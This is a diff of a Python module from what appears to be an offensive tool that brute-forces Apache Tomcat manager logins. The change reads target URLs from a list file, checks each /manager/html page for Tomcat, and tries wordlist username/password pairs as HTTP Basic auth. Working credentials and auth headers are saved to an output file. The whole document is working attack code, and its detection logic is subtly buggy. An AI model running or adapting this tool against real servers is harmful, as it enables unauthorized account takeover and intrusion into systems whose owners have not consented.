@@ -1,38 +1,45 @@
 from requests import get
-
 from urllib3 import disable_warnings
-disable_warnings()
-
 from rich import print
 from base64 import b64encode
+disable_warnings()
 
 from src.core.manager import *
 
 
-def connect() -> str:
-    """Try to connect to the target
-    """
+def connect(args) -> str:
+    " Try to connect to the target "
 
-    for url in get_urls():
-        path: str = f"{url}/manager/html"
+    targets_file = args.l
 
-        try:
-            response        = get(path, **props)
-            body: str       = response.text
-            status_code:str = response.status_code
+    with open(targets_file, "r+") as file:
+        content = file.readlines()
 
-            detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
-            (bruteforce(path)) if detect() else print(f"[red][ERR] Connection problems with {url} | {status_code}")
+        for target in content:
 
-        except Exception as e:
-            return print(f"[red][!] - An error happened: {e} [/]")
+            if target == None:
+                pass
+
+            target = target.rstrip()
+
+            path: str = f"{target}/manager/html"
+
+            try:
+                response         = get(path, **props)
+                body: str        = response.text
+                status_code: str = response.status_code
+
+                detect = lambda success = 401 or 200: status_code == success and 'Tomcat' or 'tomcat' in body
+                (bruteforce(path)) if detect() else print(f"[red][*] Connection problems with {target} | {status_code} [/]")
+
+            except Exception as e:
+                return print(f"[red][!] - An error happened: {e} [/]")
 
 
 def bruteforce(path) -> str:
-    """Bruteforce the Apache Tomcat manager login generating a cookie
-    """
+    " Bruteforce the Apache Tomcat manager login generating a cookie "
 
-    print(f"[cyan][INF] Tomcat detected in {path} starting bruteforce...")
+    print(f"[cyan][*] Tomcat detected in {path} starting bruteforce... [/]")
 
     for u, p in zip(get_usernames(), get_passwords()):
 
@@ -41,7 +48,7 @@ def bruteforce(path) -> str:
         auth_string: str  = b64encode(auth_string)
         auth_string: str  = f'Basic {auth_string}'
 
-        chars: str  = "b'"
+        chars: str        = "b'"
         auth_string: str  = auth_string.replace(chars, "")
         auth_string: str  = auth_string.replace("'", "")
 
@@ -51,7 +58,7 @@ def bruteforce(path) -> str:
         status_code: str  = response.status_code
 
         if(status_code == 200):
-            print(f"[green][INF] Login: {u+p} | URL: {path} | Cookie: {auth_string} \n")
+            print(f"[green][*] Login: {u+p} | URL: {path} | Cookie: {auth_string}\n [/]")
 
             with open("src/core/result/out.txt", "a+") as file:
                 file.write(f"{path} | {u+p} | {auth_string}")
@@ -59,4 +66,4 @@ def bruteforce(path) -> str:
         else:
             pass
 
-    print(f"[cyan][INF] Bruteforce on {path} is done.\n")
+    print(f"[cyan][*] Bruteforce on {path} is done.\n [/]")
